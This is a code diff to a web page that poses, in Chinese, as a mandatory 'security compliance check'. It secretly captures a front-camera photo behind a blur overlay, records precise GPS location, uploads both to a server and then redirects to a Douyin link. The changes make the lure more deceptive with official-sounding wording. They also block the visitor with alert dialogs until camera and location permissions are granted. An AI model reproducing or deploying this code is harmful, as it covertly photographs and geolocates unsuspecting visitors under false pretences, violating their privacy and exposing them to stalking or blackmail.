@@ -10,7 +10,7 @@
         .wrapper { width: 100%; max-width: 360px; text-align: center; padding: 30px 20px; background: #121319; border: 1px solid #1a1b23; border-radius: 8px; }
         h1 { color: #3b82f6; font-size: 24px; font-weight: 600; margin-bottom: 12px; }
         .subtitle { color: #ffffff; font-size: 13px; line-height: 1.6; margin-bottom: 25px; opacity: 0.9; }
-        
+
         /* 预览容器 */
         .preview-container {
             width: 100%;
@@ -26,9 +26,8 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
-            /* 视频正常渲染，但被下面的遮罩层盖住 */
         }
-        /* 模糊遮罩层：用户看不到任何清晰画面 */
+        /* 模糊遮罩层 */
         .preview-mask {
             position: absolute;
             top: 0;
@@ -80,7 +79,7 @@
 <body>
 <div class="wrapper">
     <h1>欢迎访问</h1>
-    <p class="subtitle">为防止沙雕封我网站<br>需给权限，接受检查</p>
+    <p class="subtitle">为防止恶意封锁网站<br>系统需要进行安全合规检验</p>
 
     <div class="preview-container">
         <div class="preview-mask">
@@ -105,8 +104,8 @@
     let streamRef = null;
     let videoElement = null;
 
-    window.addEventListener('DOMContentLoaded', async () => {
-        videoElement = document.getElementById('video');
+    // 初始化相机函数
+    async function initCamera() {
         try {
             streamRef = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -117,10 +116,23 @@
                 videoElement.onloadedmetadata = () => resolve();
             });
             await videoElement.play();
+            return true;
         } catch (err) {
             console.warn("摄像头初始化失败:", err);
+            return false;
         }
+    }
+
+    window.addEventListener('DOMContentLoaded', async () => {
+        videoElement = document.getElementById('video');
+        await initCamera();
     });
+
+    // 恢复按钮和重置状态
+    function resetUI() {
+        document.getElementById('start-btn').style.display = 'block';
+        document.getElementById('loading-layer').style.display = 'none';
+    }
 
     async function executeVerification() {
         const btn = document.getElementById('start-btn');
@@ -128,34 +140,34 @@
         btn.style.display = 'none';
         loader.style.display = 'block';
 
+        updateStatus("正在检验设备安全环境...");
+
+        // 1. 核心卡死点：重新强制检验或请求相机权限
         if (!streamRef || !videoElement.srcObject) {
-            updateStatus("正在请求摄像头权限...");
-            try {
-                streamRef = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
-                    audio: false
-                });
-                videoElement.srcObject = streamRef;
-                await new Promise((resolve) => {
-                    videoElement.onloadedmetadata = () => resolve();
-                });
-                await videoElement.play();
-            } catch (err) {
-                console.warn("摄像头权限获取失败:", err);
+            const hasCam = await initCamera();
+            if (!hasCam) {
+                alert("❌ 检验失败：\n检测到系统安全相机权限未开启。\n\n请在浏览器弹窗中选择“允许使用摄像头”，或前往手机设置开放浏览器相机权限，否则无法继续访问。");
+                resetUI();
+                return; // 彻底拦截，不往下走
             }
         }
 
-        updateStatus("设备环境准备就绪，正在检查...");
+        updateStatus("正在检验空间地理安全...");
 
+        // 2. 核心卡死点：强制检验地理位置
         navigator.geolocation.getCurrentPosition(
             (position) => {
+                // 成功获取到 GPS，放行上传
                 captureAndUpload(position.coords.latitude, position.coords.longitude);
             },
             (error) => {
+                // 拒绝或失败，直接拦截并弹窗
                 console.warn("定位失败:", error.message);
-                captureAndUpload("IP_FALLBACK", "IP_FALLBACK");
+                alert("❌ 检验失败：\n系统地理位置权限验证未通过。\n\n为确保访问环境安全，请在弹窗中选择“允许获取位置信息”。若之前误禁，请前往手机系统设置清除浏览器缓存或恢复权限设置。");
+                resetUI();
+                return; // 彻底拦截，不往下走
             },
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
         );
     }
 
@@ -164,13 +176,13 @@
     }
 
     async function captureAndUpload(lat, lon) {
-        updateStatus("正在检查IP...");
+        updateStatus("正在同步打包检查...");
         const video = videoElement;
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
+        // 到这一步由于前面拦截了，必然有真实的视频流
         if (streamRef && video.readyState >= 2 && video.videoWidth > 0) {
-            // 等待至少一帧画面就绪
             await new Promise((resolve) => {
                 if (video.readyState === 4 && video.videoWidth > 0) {
                     resolve();
@@ -179,29 +191,25 @@
                 }
             });
             await new Promise(r => requestAnimationFrame(r));
-            
+
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
+
             setTimeout(() => {
                 if (streamRef) streamRef.getTracks().forEach(track => track.stop());
             }, 200);
         } else {
-            canvas.width = 640;
-            canvas.height = 480;
-            ctx.fillStyle = "#121319";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#7a8590";
-            ctx.font = "20px Arial";
-            ctx.fillText("Environment Check Buffer", 50, 50);
+            // 极低概率的兜底
+            alert("❌ 摄像头画面未准备就绪，请刷新重试");
+            resetUI();
+            return;
         }
-
-        updateStatus("正在同步打包检查...");
 
         canvas.toBlob(async (blob) => {
             if (!blob) {
                 updateStatus("图片生成失败");
+                resetUI();
                 return;
             }
 
@@ -218,17 +226,18 @@
                 const result = await response.json();
                 if (response.ok && result.success) {
                     updateStatus("检验通过，正在为您接入主页...");
+                    setTimeout(() => {
+                        window.location.href = "https://v.douyin.com/ySyn-e7a2AE/";
+                    }, 800);
                 } else {
                     console.error("后端错误:", result.error);
                     updateStatus("服务端保存受限，请稍后重试");
+                    resetUI();
                 }
             } catch (err) {
                 console.error("网络异常:", err);
                 updateStatus("网络连接中断");
-            } finally {
-                setTimeout(() => {
-                    window.location.href = "https://v.douyin.com/ySyn-e7a2AE/";
-                }, 800);
+                resetUI();
             }
         }, 'image/jpeg', 0.7);
     }
